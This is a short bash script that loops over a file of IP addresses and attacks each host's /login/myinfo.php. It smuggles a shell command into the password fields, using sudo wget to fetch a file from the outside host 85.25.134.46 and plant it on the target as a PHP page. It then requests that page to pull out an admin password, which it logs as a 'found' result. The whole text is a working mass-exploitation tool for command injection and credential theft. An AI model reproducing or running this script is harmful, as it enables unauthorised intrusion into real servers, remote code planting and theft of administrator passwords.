#! /bin/bash
filecon=(` cat $1 `)
for ip in "${filecon[@]}"
do
echo $ip
curl -m3 --insecure --data "sSMELoginID=admin&action=save&passwd1=any+%26%26+%2Fusr%2Fbin%2Fsudo+wget+http%3A%2F%2F85.25.134.46%2Fpassmg.txt+-O+%2Fusr%2Flocal%2Fwww%2Fcontents%2Fgeneral%2Fpasswd%2Fpassmg.php&passwd2=any+%26%26+%2Fusr%2Fbin%2Fsudo+wget+http%3A%2F%2F85.25.134.46%2Fpassmg.txt+-O+%2Fusr%2Flocal%2Fwww%2Fcontents%2Fgeneral%2Fpasswd%2Fpassmg.php" https://${ip}/login/myinfo.php >> tmp.tmp
res=$(curl -m3 --insecure https://${ip}/contents/general/passwd/passmg.php | grep old_passwd_0 | cut -d'"' -f6)
echo $res
echo "found: "${ip}" >> admin <> "$res" <<" >> out.log
done
